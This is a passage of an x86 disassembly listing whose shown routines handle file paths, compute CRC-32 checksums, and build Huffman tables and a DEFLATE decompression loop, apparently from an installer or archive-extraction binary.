  40764a:	d1 f8                	sar    $1,%eax
  40764c:	50                   	push   %eax
  40764d:	56                   	push   %esi
  40764e:	57                   	push   %edi
  40764f:	e8 9c f8 ff ff       	call   0x406ef0
  407654:	57                   	push   %edi
  407655:	ff d3                	call   *%ebx
  407657:	8b f8                	mov    %eax,%edi
  407659:	56                   	push   %esi
  40765a:	ff d3                	call   *%ebx
  40765c:	8b f0                	mov    %eax,%esi
  40765e:	0f b7 0e             	movzwl (%esi),%ecx
  407661:	8b c1                	mov    %ecx,%eax
  407663:	66 85 c9             	test   %cx,%cx
  407666:	75 c6                	jne    0x40762e
  407668:	33 c0                	xor    %eax,%eax
  40766a:	6a 5c                	push   $0x5c
  40766c:	66 89 07             	mov    %ax,(%edi)
  40766f:	5e                   	pop    %esi
  407670:	57                   	push   %edi
  407671:	55                   	push   %ebp
  407672:	ff 15 88 92 40 00    	call   *0x409288
  407678:	8b f8                	mov    %eax,%edi
  40767a:	0f b7 07             	movzwl (%edi),%eax
  40767d:	83 f8 20             	cmp    $0x20,%eax
  407680:	74 05                	je     0x407687
  407682:	66 3b c6             	cmp    %si,%ax
  407685:	75 09                	jne    0x407690
  407687:	33 c0                	xor    %eax,%eax
  407689:	66 89 07             	mov    %ax,(%edi)
  40768c:	3b ef                	cmp    %edi,%ebp
  40768e:	72 e0                	jb     0x407670
  407690:	5f                   	pop    %edi
  407691:	5e                   	pop    %esi
  407692:	5d                   	pop    %ebp
  407693:	5b                   	pop    %ebx
  407694:	c2 04 00             	ret    $0x4
  407697:	8b 54 24 04          	mov    0x4(%esp),%edx
  40769b:	56                   	push   %esi
  40769c:	6a 5c                	push   $0x5c
  40769e:	5e                   	pop    %esi
  40769f:	0f b7 0a             	movzwl (%edx),%ecx
  4076a2:	8b c1                	mov    %ecx,%eax
  4076a4:	83 c8 20             	or     $0x20,%eax
  4076a7:	0f b7 c0             	movzwl %ax,%eax
  4076aa:	66 3b ce             	cmp    %si,%cx
  4076ad:	75 06                	jne    0x4076b5
  4076af:	66 39 72 02          	cmp    %si,0x2(%edx)
  4076b3:	74 10                	je     0x4076c5
  4076b5:	83 c0 9f             	add    $0xffffff9f,%eax
  4076b8:	66 83 f8 19          	cmp    $0x19,%ax
  4076bc:	77 0c                	ja     0x4076ca
  4076be:	66 83 7a 02 3a       	cmpw   $0x3a,0x2(%edx)
  4076c3:	75 05                	jne    0x4076ca
  4076c5:	33 c0                	xor    %eax,%eax
  4076c7:	40                   	inc    %eax
  4076c8:	eb 02                	jmp    0x4076cc
  4076ca:	33 c0                	xor    %eax,%eax
  4076cc:	5e                   	pop    %esi
  4076cd:	c2 04 00             	ret    $0x4
  4076d0:	83 3d 14 b4 46 00 00 	cmpl   $0x0,0x46b414
  4076d7:	56                   	push   %esi
  4076d8:	75 30                	jne    0x40770a
  4076da:	33 c9                	xor    %ecx,%ecx
  4076dc:	6a 08                	push   $0x8
  4076de:	8b d1                	mov    %ecx,%edx
  4076e0:	5e                   	pop    %esi
  4076e1:	8b c2                	mov    %edx,%eax
  4076e3:	24 01                	and    $0x1,%al
  4076e5:	0f b6 c0             	movzbl %al,%eax
  4076e8:	f7 d8                	neg    %eax
  4076ea:	1b c0                	sbb    %eax,%eax
  4076ec:	d1 ea                	shr    $1,%edx
  4076ee:	25 20 83 b8 ed       	and    $0xedb88320,%eax
  4076f3:	33 d0                	xor    %eax,%edx
  4076f5:	83 ee 01             	sub    $0x1,%esi
  4076f8:	75 e7                	jne    0x4076e1
  4076fa:	89 14 8d 10 b4 46 00 	mov    %edx,0x46b410(,%ecx,4)
  407701:	41                   	inc    %ecx
  407702:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  407708:	7c d2                	jl     0x4076dc
  40770a:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  40770e:	8b 54 24 10          	mov    0x10(%esp),%edx
  407712:	f7 d1                	not    %ecx
  407714:	85 d2                	test   %edx,%edx
  407716:	74 1c                	je     0x407734
  407718:	8b 74 24 0c          	mov    0xc(%esp),%esi
  40771c:	0f b6 06             	movzbl (%esi),%eax
  40771f:	33 c1                	xor    %ecx,%eax
  407721:	c1 e9 08             	shr    $0x8,%ecx
  407724:	0f b6 c0             	movzbl %al,%eax
  407727:	33 0c 85 10 b4 46 00 	xor    0x46b410(,%eax,4),%ecx
  40772e:	46                   	inc    %esi
  40772f:	83 ea 01             	sub    $0x1,%edx
  407732:	75 e8                	jne    0x40771c
  407734:	f7 d1                	not    %ecx
  407736:	8b c1                	mov    %ecx,%eax
  407738:	5e                   	pop    %esi
  407739:	c2 0c 00             	ret    $0xc
  40773c:	81 ec f8 00 00 00    	sub    $0xf8,%esp
  407742:	33 c0                	xor    %eax,%eax
  407744:	53                   	push   %ebx
  407745:	8b 9c 24 00 01 00 00 	mov    0x100(%esp),%ebx
  40774c:	55                   	push   %ebp
  40774d:	8b ac 24 08 01 00 00 	mov    0x108(%esp),%ebp
  407754:	8b d5                	mov    %ebp,%edx
  407756:	56                   	push   %esi
  407757:	57                   	push   %edi
  407758:	6a 10                	push   $0x10
  40775a:	59                   	pop    %ecx
  40775b:	8d 7c 24 4c          	lea    0x4c(%esp),%edi
  40775f:	f3 ab                	rep stos %eax,%es:(%edi)
  407761:	8b cb                	mov    %ebx,%ecx
  407763:	8b 01                	mov    (%ecx),%eax
  407765:	8d 49 04             	lea    0x4(%ecx),%ecx
  407768:	ff 44 84 4c          	incl   0x4c(%esp,%eax,4)
  40776c:	83 ea 01             	sub    $0x1,%edx
  40776f:	75 f2                	jne    0x407763
  407771:	39 6c 24 4c          	cmp    %ebp,0x4c(%esp)
  407775:	75 1b                	jne    0x407792
  407777:	8b 84 24 20 01 00 00 	mov    0x120(%esp),%eax
  40777e:	33 f6                	xor    %esi,%esi
  407780:	89 30                	mov    %esi,(%eax)
  407782:	8b 84 24 24 01 00 00 	mov    0x124(%esp),%eax
  407789:	89 30                	mov    %esi,(%eax)
  40778b:	33 c0                	xor    %eax,%eax
  40778d:	e9 7d 03 00 00       	jmp    0x407b0f
  407792:	8b bc 24 24 01 00 00 	mov    0x124(%esp),%edi
  407799:	33 c9                	xor    %ecx,%ecx
  40779b:	6a 0f                	push   $0xf
  40779d:	41                   	inc    %ecx
  40779e:	33 f6                	xor    %esi,%esi
  4077a0:	58                   	pop    %eax
  4077a1:	39 74 8c 4c          	cmp    %esi,0x4c(%esp,%ecx,4)
  4077a5:	75 05                	jne    0x4077ac
  4077a7:	41                   	inc    %ecx
  4077a8:	3b c8                	cmp    %eax,%ecx
  4077aa:	76 f5                	jbe    0x4077a1
  4077ac:	39 0f                	cmp    %ecx,(%edi)
  4077ae:	8b d1                	mov    %ecx,%edx
  4077b0:	89 4c 24 2c          	mov    %ecx,0x2c(%esp)
  4077b4:	0f 43 17             	cmovae (%edi),%edx
  4077b7:	39 74 84 4c          	cmp    %esi,0x4c(%esp,%eax,4)
  4077bb:	75 05                	jne    0x4077c2
  4077bd:	83 e8 01             	sub    $0x1,%eax
  4077c0:	75 f5                	jne    0x4077b7
  4077c2:	3b d0                	cmp    %eax,%edx
  4077c4:	89 44 24 30          	mov    %eax,0x30(%esp)
  4077c8:	8b e8                	mov    %eax,%ebp
  4077ca:	0f 46 ea             	cmovbe %edx,%ebp
  4077cd:	8b d5                	mov    %ebp,%edx
  4077cf:	89 6c 24 1c          	mov    %ebp,0x1c(%esp)
  4077d3:	8b ac 24 10 01 00 00 	mov    0x110(%esp),%ebp
  4077da:	89 17                	mov    %edx,(%edi)
  4077dc:	33 ff                	xor    %edi,%edi
  4077de:	47                   	inc    %edi
  4077df:	d3 e7                	shl    %cl,%edi
  4077e1:	eb 0d                	jmp    0x4077f0
  4077e3:	2b 7c 8c 4c          	sub    0x4c(%esp,%ecx,4),%edi
  4077e7:	0f 88 1f 03 00 00    	js     0x407b0c
  4077ed:	41                   	inc    %ecx
  4077ee:	03 ff                	add    %edi,%edi
  4077f0:	3b c8                	cmp    %eax,%ecx
  4077f2:	72 ef                	jb     0x4077e3
  4077f4:	8b c8                	mov    %eax,%ecx
  4077f6:	8b d7                	mov    %edi,%edx
  4077f8:	c1 e1 02             	shl    $0x2,%ecx
  4077fb:	89 4c 24 34          	mov    %ecx,0x34(%esp)
  4077ff:	2b 7c 0c 4c          	sub    0x4c(%esp,%ecx,1),%edi
  407803:	89 7c 24 48          	mov    %edi,0x48(%esp)
  407807:	0f 88 ff 02 00 00    	js     0x407b0c
  40780d:	89 54 0c 4c          	mov    %edx,0x4c(%esp,%ecx,1)
  407811:	8b d6                	mov    %esi,%edx
  407813:	89 b4 24 90 00 00 00 	mov    %esi,0x90(%esp)
  40781a:	83 e8 01             	sub    $0x1,%eax
  40781d:	74 15                	je     0x407834
  40781f:	8b ce                	mov    %esi,%ecx
  407821:	03 54 0c 50          	add    0x50(%esp,%ecx,1),%edx
  407825:	8d 49 04             	lea    0x4(%ecx),%ecx
  407828:	89 94 0c 90 00 00 00 	mov    %edx,0x90(%esp,%ecx,1)
  40782f:	83 e8 01             	sub    $0x1,%eax
  407832:	75 ed                	jne    0x407821
  407834:	8b ce                	mov    %esi,%ecx
  407836:	8b 13                	mov    (%ebx),%edx
  407838:	8d 5b 04             	lea    0x4(%ebx),%ebx
  40783b:	85 d2                	test   %edx,%edx
  40783d:	74 16                	je     0x407855
  40783f:	8b 84 94 8c 00 00 00 	mov    0x8c(%esp,%edx,4),%eax
  407846:	89 0c 85 a0 c0 46 00 	mov    %ecx,0x46c0a0(,%eax,4)
  40784d:	40                   	inc    %eax
  40784e:	89 84 94 8c 00 00 00 	mov    %eax,0x8c(%esp,%edx,4)
  407855:	41                   	inc    %ecx
  407856:	3b cd                	cmp    %ebp,%ecx
  407858:	72 dc                	jb     0x407836
  40785a:	8b 44 24 34          	mov    0x34(%esp),%eax
  40785e:	8b ee                	mov    %esi,%ebp
  407860:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  407864:	8b d9                	mov    %ecx,%ebx
  407866:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  40786a:	f7 db                	neg    %ebx
  40786c:	89 6c 24 28          	mov    %ebp,0x28(%esp)
  407870:	8b 84 04 8c 00 00 00 	mov    0x8c(%esp,%eax,1),%eax
  407877:	89 44 24 44          	mov    %eax,0x44(%esp)
  40787b:	83 c8 ff             	or     $0xffffffff,%eax
  40787e:	89 b4 24 8c 00 00 00 	mov    %esi,0x8c(%esp)
  407885:	c7 44 24 20 a0 c0 46 	movl   $0x46c0a0,0x20(%esp)
  40788c:	00 
  40788d:	89 44 24 14          	mov    %eax,0x14(%esp)
  407891:	89 b4 24 cc 00 00 00 	mov    %esi,0xcc(%esp)
  407898:	89 74 24 24          	mov    %esi,0x24(%esp)
  40789c:	89 74 24 38          	mov    %esi,0x38(%esp)
  4078a0:	3b 54 24 30          	cmp    0x30(%esp),%edx
  4078a4:	0f 8f 53 02 00 00    	jg     0x407afd
  4078aa:	8d 44 24 4c          	lea    0x4c(%esp),%eax
  4078ae:	8d 04 90             	lea    (%eax,%edx,4),%eax
  4078b1:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  4078b5:	8b 00                	mov    (%eax),%eax
  4078b7:	e9 1c 02 00 00       	jmp    0x407ad8
  4078bc:	89 44 24 40          	mov    %eax,0x40(%esp)
  4078c0:	48                   	dec    %eax
  4078c1:	89 44 24 34          	mov    %eax,0x34(%esp)
  4078c5:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  4078c8:	e9 ed 00 00 00       	jmp    0x4079ba
  4078cd:	8b 6c 24 30          	mov    0x30(%esp),%ebp
  4078d1:	ff 44 24 14          	incl   0x14(%esp)
  4078d5:	2b e8                	sub    %eax,%ebp
  4078d7:	3b e9                	cmp    %ecx,%ebp
  4078d9:	0f 47 e9             	cmova  %ecx,%ebp
  4078dc:	8b ca                	mov    %edx,%ecx
  4078de:	33 d2                	xor    %edx,%edx
  4078e0:	2b c8                	sub    %eax,%ecx
  4078e2:	42                   	inc    %edx
  4078e3:	d3 e2                	shl    %cl,%edx
  4078e5:	3b 54 24 40          	cmp    0x40(%esp),%edx
  4078e9:	76 23                	jbe    0x40790e
  4078eb:	83 c8 ff             	or     $0xffffffff,%eax
  4078ee:	2b 44 24 34          	sub    0x34(%esp),%eax
  4078f2:	03 d0                	add    %eax,%edx
  4078f4:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  4078f8:	3b cd                	cmp    %ebp,%ecx
  4078fa:	73 12                	jae    0x40790e
  4078fc:	41                   	inc    %ecx
  4078fd:	3b cd                	cmp    %ebp,%ecx
  4078ff:	73 0d                	jae    0x40790e
  407901:	03 d2                	add    %edx,%edx
  407903:	8d 40 04             	lea    0x4(%eax),%eax
  407906:	3b 10                	cmp    (%eax),%edx
  407908:	76 04                	jbe    0x40790e
  40790a:	2b 10                	sub    (%eax),%edx
  40790c:	eb ee                	jmp    0x4078fc
  40790e:	8b 94 24 2c 01 00 00 	mov    0x12c(%esp),%edx
  407915:	33 ed                	xor    %ebp,%ebp
  407917:	45                   	inc    %ebp
  407918:	d3 e5                	shl    %cl,%ebp
  40791a:	89 6c 24 38          	mov    %ebp,0x38(%esp)
  40791e:	8b 12                	mov    (%edx),%edx
  407920:	03 ea                	add    %edx,%ebp
  407922:	81 fd a0 05 00 00    	cmp    $0x5a0,%ebp
  407928:	0f 87 de 01 00 00    	ja     0x407b0c
  40792e:	8b 84 24 28 01 00 00 	mov    0x128(%esp),%eax
  407935:	8d 14 90             	lea    (%eax,%edx,4),%edx
  407938:	89 54 24 24          	mov    %edx,0x24(%esp)
  40793c:	8b 54 24 14          	mov    0x14(%esp),%edx
  407940:	8b 44 24 24          	mov    0x24(%esp),%eax
  407944:	89 84 94 cc 00 00 00 	mov    %eax,0xcc(%esp,%edx,4)
  40794b:	8b 84 24 2c 01 00 00 	mov    0x12c(%esp),%eax
  407952:	89 28                	mov    %ebp,(%eax)
  407954:	8b 44 24 18          	mov    0x18(%esp),%eax
  407958:	8b 6c 24 28          	mov    0x28(%esp),%ebp
  40795c:	85 d2                	test   %edx,%edx
  40795e:	74 41                	je     0x4079a1
  407960:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  407964:	88 44 24 11          	mov    %al,0x11(%esp)
  407968:	8b 44 24 14          	mov    0x14(%esp),%eax
  40796c:	88 4c 24 10          	mov    %cl,0x10(%esp)
  407970:	8b cb                	mov    %ebx,%ecx
  407972:	89 ac 94 8c 00 00 00 	mov    %ebp,0x8c(%esp,%edx,4)
  407979:	8b d5                	mov    %ebp,%edx
  40797b:	d3 ea                	shr    %cl,%edx
  40797d:	8b 8c 84 c8 00 00 00 	mov    0xc8(%esp,%eax,4),%ecx
  407984:	8b 44 24 24          	mov    0x24(%esp),%eax
  407988:	2b c1                	sub    %ecx,%eax
  40798a:	c1 f8 02             	sar    $0x2,%eax
  40798d:	2b c2                	sub    %edx,%eax
  40798f:	66 89 44 24 12       	mov    %ax,0x12(%esp)
  407994:	8b 44 24 10          	mov    0x10(%esp),%eax
  407998:	89 04 91             	mov    %eax,(%ecx,%edx,4)
  40799b:	8b 44 24 18          	mov    0x18(%esp),%eax
  40799f:	eb 0d                	jmp    0x4079ae
  4079a1:	8b 94 24 20 01 00 00 	mov    0x120(%esp),%edx
  4079a8:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4079ac:	89 0a                	mov    %ecx,(%edx)
  4079ae:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  4079b2:	8b d8                	mov    %eax,%ebx
  4079b4:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  4079b8:	03 c1                	add    %ecx,%eax
  4079ba:	89 44 24 18          	mov    %eax,0x18(%esp)
  4079be:	3b d0                	cmp    %eax,%edx
  4079c0:	0f 8f 07 ff ff ff    	jg     0x4078cd
  4079c6:	8a c2                	mov    %dl,%al
  4079c8:	2a c3                	sub    %bl,%al
  4079ca:	88 44 24 11          	mov    %al,0x11(%esp)
  4079ce:	8b 44 24 44          	mov    0x44(%esp),%eax
  4079d2:	8d 04 85 a0 c0 46 00 	lea    0x46c0a0(,%eax,4),%eax
  4079d9:	39 44 24 20          	cmp    %eax,0x20(%esp)
  4079dd:	72 07                	jb     0x4079e6
  4079df:	c6 44 24 10 c0       	movb   $0xc0,0x10(%esp)
  4079e4:	eb 5b                	jmp    0x407a41
  4079e6:	8b 44 24 20          	mov    0x20(%esp),%eax
  4079ea:	8b 08                	mov    (%eax),%ecx
  4079ec:	8d 68 04             	lea    0x4(%eax),%ebp
  4079ef:	3b 8c 24 14 01 00 00 	cmp    0x114(%esp),%ecx
  4079f6:	73 1a                	jae    0x407a12
  4079f8:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  4079fe:	0f 92 c0             	setb   %al
  407a01:	fe c8                	dec    %al
  407a03:	24 60                	and    $0x60,%al
  407a05:	88 44 24 10          	mov    %al,0x10(%esp)
  407a09:	8b 44 24 20          	mov    0x20(%esp),%eax
  407a0d:	66 8b 00             	mov    (%eax),%ax
  407a10:	eb 22                	jmp    0x407a34
  407a12:	2b 8c 24 14 01 00 00 	sub    0x114(%esp),%ecx
  407a19:	8b 84 24 1c 01 00 00 	mov    0x11c(%esp),%eax
  407a20:	8a 04 48             	mov    (%eax,%ecx,2),%al
  407a23:	04 50                	add    $0x50,%al
  407a25:	88 44 24 10          	mov    %al,0x10(%esp)
  407a29:	8b 84 24 18 01 00 00 	mov    0x118(%esp),%eax
  407a30:	66 8b 04 48          	mov    (%eax,%ecx,2),%ax
  407a34:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  407a38:	8b 6c 24 28          	mov    0x28(%esp),%ebp
  407a3c:	66 89 44 24 12       	mov    %ax,0x12(%esp)
  407a41:	8b ca                	mov    %edx,%ecx
  407a43:	33 c0                	xor    %eax,%eax
  407a45:	2b cb                	sub    %ebx,%ecx
  407a47:	40                   	inc    %eax
  407a48:	d3 e0                	shl    %cl,%eax
  407a4a:	8b d5                	mov    %ebp,%edx
  407a4c:	8b cb                	mov    %ebx,%ecx
  407a4e:	89 44 24 40          	mov    %eax,0x40(%esp)
  407a52:	d3 ea                	shr    %cl,%edx
  407a54:	3b 54 24 38          	cmp    0x38(%esp),%edx
  407a58:	73 1d                	jae    0x407a77
  407a5a:	8b 44 24 10          	mov    0x10(%esp),%eax
  407a5e:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  407a62:	8b 7c 24 24          	mov    0x24(%esp),%edi
  407a66:	89 04 97             	mov    %eax,(%edi,%edx,4)
  407a69:	03 d1                	add    %ecx,%edx
  407a6b:	3b 54 24 38          	cmp    0x38(%esp),%edx
  407a6f:	72 f5                	jb     0x407a66
  407a71:	8b 7c 24 48          	mov    0x48(%esp),%edi
  407a75:	33 f6                	xor    %esi,%esi
  407a77:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  407a7b:	33 c0                	xor    %eax,%eax
  407a7d:	40                   	inc    %eax
  407a7e:	8d 4a ff             	lea    -0x1(%edx),%ecx
  407a81:	d3 e0                	shl    %cl,%eax
  407a83:	eb 04                	jmp    0x407a89
  407a85:	33 e8                	xor    %eax,%ebp
  407a87:	d1 e8                	shr    $1,%eax
  407a89:	85 c5                	test   %eax,%ebp
  407a8b:	75 f8                	jne    0x407a85
  407a8d:	33 e8                	xor    %eax,%ebp
  407a8f:	8b cb                	mov    %ebx,%ecx
  407a91:	33 c0                	xor    %eax,%eax
  407a93:	89 6c 24 28          	mov    %ebp,0x28(%esp)
  407a97:	40                   	inc    %eax
  407a98:	d3 e0                	shl    %cl,%eax
  407a9a:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  407a9e:	48                   	dec    %eax
  407a9f:	23 c5                	and    %ebp,%eax
  407aa1:	3b 84 8c 8c 00 00 00 	cmp    0x8c(%esp,%ecx,4),%eax
  407aa8:	74 26                	je     0x407ad0
  407aaa:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  407aae:	8b f1                	mov    %ecx,%esi
  407ab0:	33 c0                	xor    %eax,%eax
  407ab2:	2b da                	sub    %edx,%ebx
  407ab4:	40                   	inc    %eax
  407ab5:	8b cb                	mov    %ebx,%ecx
  407ab7:	d3 e0                	shl    %cl,%eax
  407ab9:	4e                   	dec    %esi
  407aba:	48                   	dec    %eax
  407abb:	23 c5                	and    %ebp,%eax
  407abd:	3b 84 b4 8c 00 00 00 	cmp    0x8c(%esp,%esi,4),%eax
  407ac4:	75 ea                	jne    0x407ab0
  407ac6:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  407aca:	89 74 24 14          	mov    %esi,0x14(%esp)
  407ace:	33 f6                	xor    %esi,%esi
  407ad0:	8b 44 24 34          	mov    0x34(%esp),%eax
  407ad4:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  407ad8:	85 c0                	test   %eax,%eax
  407ada:	0f 85 dc fd ff ff    	jne    0x4078bc
  407ae0:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  407ae4:	42                   	inc    %edx
  407ae5:	83 c0 04             	add    $0x4,%eax
  407ae8:	89 54 24 2c          	mov    %edx,0x2c(%esp)
  407aec:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  407af0:	3b 54 24 30          	cmp    0x30(%esp),%edx
  407af4:	0f 8e bb fd ff ff    	jle    0x4078b5
  407afa:	83 c8 ff             	or     $0xffffffff,%eax
  407afd:	85 ff                	test   %edi,%edi
  407aff:	74 07                	je     0x407b08
  407b01:	83 7c 24 30 01       	cmpl   $0x1,0x30(%esp)
  407b06:	75 07                	jne    0x407b0f
  407b08:	8b c6                	mov    %esi,%eax
  407b0a:	eb 03                	jmp    0x407b0f
  407b0c:	83 c8 ff             	or     $0xffffffff,%eax
  407b0f:	5f                   	pop    %edi
  407b10:	5e                   	pop    %esi
  407b11:	5d                   	pop    %ebp
  407b12:	5b                   	pop    %ebx
  407b13:	81 c4 f8 00 00 00    	add    $0xf8,%esp
  407b19:	c2 24 00             	ret    $0x24
  407b1c:	83 ec 38             	sub    $0x38,%esp
  407b1f:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  407b23:	53                   	push   %ebx
  407b24:	55                   	push   %ebp
  407b25:	56                   	push   %esi
  407b26:	8b 02                	mov    (%edx),%eax
  407b28:	8d 5a 10             	lea    0x10(%edx),%ebx
  407b2b:	8b 8b a8 9b 00 00    	mov    0x9ba8(%ebx),%ecx
  407b31:	8b ab a4 9b 00 00    	mov    0x9ba4(%ebx),%ebp
  407b37:	8b b3 18 05 00 00    	mov    0x518(%ebx),%esi
  407b3d:	89 44 24 10          	mov    %eax,0x10(%esp)
  407b41:	8b 42 04             	mov    0x4(%edx),%eax
  407b44:	8d 93 a0 9b 00 00    	lea    0x9ba0(%ebx),%edx
  407b4a:	89 5c 24 30          	mov    %ebx,0x30(%esp)
  407b4e:	89 44 24 0c          	mov    %eax,0xc(%esp)
  407b52:	89 74 24 20          	mov    %esi,0x20(%esp)
  407b56:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  407b5a:	89 54 24 1c          	mov    %edx,0x1c(%esp)
  407b5e:	57                   	push   %edi
  407b5f:	8b bb 1c 05 00 00    	mov    0x51c(%ebx),%edi
  407b65:	3b cd                	cmp    %ebp,%ecx
  407b67:	73 05                	jae    0x407b6e
  407b69:	2b e9                	sub    %ecx,%ebp
  407b6b:	4d                   	dec    %ebp
  407b6c:	eb 08                	jmp    0x407b76
  407b6e:	8b 2a                	mov    (%edx),%ebp
  407b70:	2b e9                	sub    %ecx,%ebp
  407b72:	89 54 24 20          	mov    %edx,0x20(%esp)
  407b76:	83 4c 24 1c ff       	orl    $0xffffffff,0x1c(%esp)
  407b7b:	6a 0f                	push   $0xf
  407b7d:	5a                   	pop    %edx
  407b7e:	89 54 24 38          	mov    %edx,0x38(%esp)
  407b82:	e9 14 0b 00 00       	jmp    0x40869b
  407b87:	8b 13                	mov    (%ebx),%edx
  407b89:	ff 24 95 14 88 40 00 	jmp    *0x408814(,%edx,4)
  407b90:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  407b94:	83 fe 03             	cmp    $0x3,%esi
  407b97:	73 35                	jae    0x407bce
  407b99:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  407b9d:	85 c0                	test   %eax,%eax
  407b9f:	0f 84 03 0b 00 00    	je     0x4086a8
  407ba5:	48                   	dec    %eax
  407ba6:	89 44 24 10          	mov    %eax,0x10(%esp)
  407baa:	0f b6 01             	movzbl (%ecx),%eax
  407bad:	8b ce                	mov    %esi,%ecx
  407baf:	d3 e0                	shl    %cl,%eax
  407bb1:	83 c6 08             	add    $0x8,%esi
  407bb4:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  407bb8:	0b f8                	or     %eax,%edi
  407bba:	6a 03                	push   $0x3
  407bbc:	58                   	pop    %eax
  407bbd:	41                   	inc    %ecx
  407bbe:	3b f0                	cmp    %eax,%esi
  407bc0:	8b 44 24 10          	mov    0x10(%esp),%eax
  407bc4:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  407bc8:	72 d3                	jb     0x407b9d
  407bca:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  407bce:	8b c7                	mov    %edi,%eax
  407bd0:	83 c6 fd             	add    $0xfffffffd,%esi
  407bd3:	83 e0 07             	and    $0x7,%eax
  407bd6:	c1 ef 03             	shr    $0x3,%edi
  407bd9:	89 44 24 30          	mov    %eax,0x30(%esp)
  407bdd:	a8 01                	test   $0x1,%al
  407bdf:	6a 08                	push   $0x8
  407be1:	58                   	pop    %eax
  407be2:	0f 45 44 24 38       	cmovne 0x38(%esp),%eax
  407be7:	89 83 14 05 00 00    	mov    %eax,0x514(%ebx)
  407bed:	8b 44 24 30          	mov    0x30(%esp),%eax
  407bf1:	d1 e8                	shr    $1,%eax
  407bf3:	89 7c 24 28          	mov    %edi,0x28(%esp)
  407bf7:	89 74 24 24          	mov    %esi,0x24(%esp)
  407bfb:	83 e8 00             	sub    $0x0,%eax
  407bfe:	0f 84 10 01 00 00    	je     0x407d14
  407c04:	83 e8 01             	sub    $0x1,%eax
  407c07:	74 22                	je     0x407c2b
  407c09:	83 e8 01             	sub    $0x1,%eax
  407c0c:	74 12                	je     0x407c20
  407c0e:	83 e8 01             	sub    $0x1,%eax
  407c11:	8b 44 24 10          	mov    0x10(%esp),%eax
  407c15:	0f 84 b5 0b 00 00    	je     0x4087d0
  407c1b:	e9 78 0a 00 00       	jmp    0x408698
  407c20:	c7 03 0b 00 00 00    	movl   $0xb,(%ebx)
  407c26:	e9 69 0a 00 00       	jmp    0x408694
  407c2b:	80 3d 10 b8 46 00 00 	cmpb   $0x0,0x46b810
  407c32:	0f 85 b0 00 00 00    	jne    0x407ce8
  407c38:	83 64 24 2c 00       	andl   $0x0,0x2c(%esp)
  407c3d:	33 c0                	xor    %eax,%eax
  407c3f:	6a 07                	push   $0x7
  407c41:	5b                   	pop    %ebx
  407c42:	6a 08                	push   $0x8
  407c44:	59                   	pop    %ecx
  407c45:	3d 8f 00 00 00       	cmp    $0x8f,%eax
  407c4a:	76 17                	jbe    0x407c63
  407c4c:	3d 00 01 00 00       	cmp    $0x100,%eax
  407c51:	73 05                	jae    0x407c58
  407c53:	6a 09                	push   $0x9
  407c55:	59                   	pop    %ecx
  407c56:	eb 0b                	jmp    0x407c63
  407c58:	6a 08                	push   $0x8
  407c5a:	3d 18 01 00 00       	cmp    $0x118,%eax
  407c5f:	59                   	pop    %ecx
  407c60:	0f 42 cb             	cmovb  %ebx,%ecx
  407c63:	89 0c 85 20 c5 46 00 	mov    %ecx,0x46c520(,%eax,4)
  407c6a:	40                   	inc    %eax
  407c6b:	b9 20 01 00 00       	mov    $0x120,%ecx
  407c70:	3b c1                	cmp    %ecx,%eax
  407c72:	7c ce                	jl     0x407c42
  407c74:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  407c78:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  407c7c:	50                   	push   %eax
  407c7d:	68 18 b8 46 00       	push   $0x46b818
  407c82:	68 e8 c0 40 00       	push   $0x40c0e8
  407c87:	68 98 c0 46 00       	push   $0x46c098
  407c8c:	68 a4 ab 40 00       	push   $0x40aba4
  407c91:	68 64 ab 40 00       	push   $0x40ab64
  407c96:	68 01 01 00 00       	push   $0x101
  407c9b:	51                   	push   %ecx
  407c9c:	68 20 c5 46 00       	push   $0x46c520
  407ca1:	e8 96 fa ff ff       	call   0x40773c
  407ca6:	6a 1e                	push   $0x1e
  407ca8:	59                   	pop    %ecx
  407ca9:	6a 05                	push   $0x5
  407cab:	58                   	pop    %eax
  407cac:	ba 20 c5 46 00       	mov    $0x46c520,%edx
  407cb1:	8b fa                	mov    %edx,%edi
  407cb3:	f3 ab                	rep stos %eax,%es:(%edi)
  407cb5:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  407cb9:	50                   	push   %eax
  407cba:	68 18 b8 46 00       	push   $0x46b818
  407cbf:	68 ec c0 40 00       	push   $0x40c0ec
  407cc4:	68 9c c0 46 00       	push   $0x46c09c
  407cc9:	68 20 ac 40 00       	push   $0x40ac20
  407cce:	68 e4 ab 40 00       	push   $0x40abe4
  407cd3:	6a 00                	push   $0x0
  407cd5:	6a 1e                	push   $0x1e
  407cd7:	52                   	push   %edx
  407cd8:	e8 5f fa ff ff       	call   0x40773c
  407cdd:	8b 7c 24 28          	mov    0x28(%esp),%edi
  407ce1:	c6 05 10 b8 46 00 01 	movb   $0x1,0x46b810
  407ce8:	a0 e8 c0 40 00       	mov    0x40c0e8,%al
  407ced:	88 43 10             	mov    %al,0x10(%ebx)
  407cf0:	a0 ec c0 40 00       	mov    0x40c0ec,%al
  407cf5:	88 43 11             	mov    %al,0x11(%ebx)
  407cf8:	a1 98 c0 46 00       	mov    0x46c098,%eax
